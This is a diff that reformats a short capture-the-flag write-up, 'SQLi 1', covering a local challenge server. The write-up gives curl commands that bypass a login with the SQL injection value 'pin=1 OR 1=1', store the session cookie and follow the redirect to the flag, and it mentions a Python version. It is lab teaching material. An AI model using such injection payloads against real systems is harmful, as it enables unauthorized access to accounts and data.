@@ -1,18 +1,24 @@
 # SQLi 1
 
-First run a request to see what’s happening:
+#### First run a request to see what’s happening:
 
 ```curl -v -d “userid=guest&pin=1337” http://challenge.localhost:80/gateway```
 
-After running the request, it issues a cookie and says it should be redirected. After trying to follow the redirects by rerunning the code with “-L” it caused an infinite loop, meaning it’s expecting the cookie on the redirecting POST request. So lets copy the cookie:
+--------------------------------------------------
+
+#### After running the request, it issues a cookie and says it should be redirected. After trying to follow the redirects by rerunning the code with “-L” it caused an infinite loop, meaning it’s expecting the cookie on the redirecting POST request. So lets copy the cookie:
 
 ```curl -c cookie -d “userid=admin&pin=1 OR 1=1” http://challenge.localhost:80/gateway```
 
-Then use the cookie to follow the redirect to the flag:
+----------------------------------------------------
+
+#### Then use the cookie to follow the redirect to the flag:
 
 ```curl -L -b cookie “http://challenge.localhost:80/gateway```
 
-Or the python version, set it up to be reusable:
+-----------------------------------------------
+
+#### Or the python version, set it up to be reusable:
 ``` python
 import requests
 
@@ -29,7 +35,9 @@ print(response.text)
 ```
 ```python3 requesting.py```
 
-Or in terminal:
+------------------------------------------------
+
+#### Or in terminal:
 
 ```Python```
 ```
